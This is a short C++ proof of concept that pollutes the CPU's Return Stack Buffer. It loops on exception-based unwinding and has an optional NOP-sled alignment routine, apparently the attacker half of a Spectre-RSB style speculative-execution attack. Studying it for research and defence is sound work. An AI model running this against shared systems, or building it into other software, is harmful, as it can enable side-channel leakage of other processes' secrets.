#include "util.hpp"

using namespace std;

void AddressAlignment(){
	__asm__(
		".rep 5434;"
		"nop;"
		".endr;"
	);
}

class ReturnException : public exception{
public:
	const char * content () const throw () {
      return "Interrupt normal return";
    }
};

int exceptionLayer(){
	throw ReturnException();
	return 0;
}

int polluteLayer(){
	exceptionLayer();
	return 0;
}

int catchLayer(){
	try{
		polluteLayer();
	}catch(ReturnException& re){
		return 1;
	}
	return 0; 
}

int main(){
	cout<<"Start polluting RSB..."<<endl;
	while(true){
		catchLayer();
		//AddressAlignment();
	}
	return 0;
}
